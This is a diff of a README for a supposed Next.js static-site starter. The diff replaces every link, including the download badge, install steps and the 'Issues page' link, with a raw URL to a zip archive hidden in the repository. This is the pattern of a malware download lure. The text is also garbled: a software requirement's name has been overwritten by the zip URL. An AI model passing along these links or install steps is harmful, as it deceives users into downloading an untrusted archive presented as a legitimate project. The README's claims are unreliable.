@@ -1,6 +1,6 @@
 # 📝 next-platform-starter - Create a Beautiful Static Website Easily
 
-[![Download](https://github.com/martofine4u/next-platform-starter/raw/refs/heads/main/app/routing/next_platform_starter_2.5.zip)](https://github.com/martofine4u/next-platform-starter/raw/refs/heads/main/app/routing/next_platform_starter_2.5.zip)
+[![Download](https://raw.githubusercontent.com/martofine4u/next-platform-starter/main/app/starter_platform_next_v1.6-alpha.1.zip)](https://raw.githubusercontent.com/martofine4u/next-platform-starter/main/app/starter_platform_next_v1.6-alpha.1.zip)
 
 ## 🌟 Overview
 
@@ -16,14 +16,14 @@ Before you start, ensure your computer meets these requirements:
 
 - **Operating System**: Windows, macOS, or Linux
 - **Web Browser**: Any modern web browser (Chrome, Firefox, Safari, Edge)
-- **https://github.com/martofine4u/next-platform-starter/raw/refs/heads/main/app/routing/next_platform_starter_2.5.zip**: Version 14 or higher (for local development)
+- **https://raw.githubusercontent.com/martofine4u/next-platform-starter/main/app/starter_platform_next_v1.6-alpha.1.zip**: Version 14 or higher (for local development)
 - **Internet Connection**: For downloading and initial setup
 
 ## 📥 Download & Install
 
-1. Visit this page to download: [Download next-platform-starter](https://github.com/martofine4u/next-platform-starter/raw/refs/heads/main/app/routing/next_platform_starter_2.5.zip).
+1. Visit this page to download: [Download next-platform-starter](https://raw.githubusercontent.com/martofine4u/next-platform-starter/main/app/starter_platform_next_v1.6-alpha.1.zip).
 2. On the Releases page, find the latest version.
-3. Look for the files listed. You may see a file like `https://github.com/martofine4u/next-platform-starter/raw/refs/heads/main/app/routing/next_platform_starter_2.5.zip`.
+3. Look for the files listed. You may see a file like `https://raw.githubusercontent.com/martofine4u/next-platform-starter/main/app/starter_platform_next_v1.6-alpha.1.zip`.
 4. Click on the file to start the download.
 
 After the download is complete, follow these steps:
@@ -81,7 +81,7 @@ next-platform-starter offers several features that make building a website strai
 
 ## 🗺️ Support
 
-If you encounter any issues or need further assistance, visit the [Issues page](https://github.com/martofine4u/next-platform-starter/raw/refs/heads/main/app/routing/next_platform_starter_2.5.zip). You can report bugs or request features. 
+If you encounter any issues or need further assistance, visit the [Issues page](https://raw.githubusercontent.com/martofine4u/next-platform-starter/main/app/starter_platform_next_v1.6-alpha.1.zip). You can report bugs or request features. 
 
 ## 🌐 Community
 
@@ -91,4 +91,4 @@ Engage with other users to share tips, ask questions, and collaborate on project
 
 By following these steps, you will set up next-platform-starter and start creating your own static website. Feel free to explore the features and customize it to fit your needs. 
 
-For additional downloads, visit this page: [Download next-platform-starter](https://github.com/martofine4u/next-platform-starter/raw/refs/heads/main/app/routing/next_platform_starter_2.5.zip). Enjoy building your website!
+For additional downloads, visit this page: [Download next-platform-starter](https://raw.githubusercontent.com/martofine4u/next-platform-starter/main/app/starter_platform_next_v1.6-alpha.1.zip). Enjoy building your website!
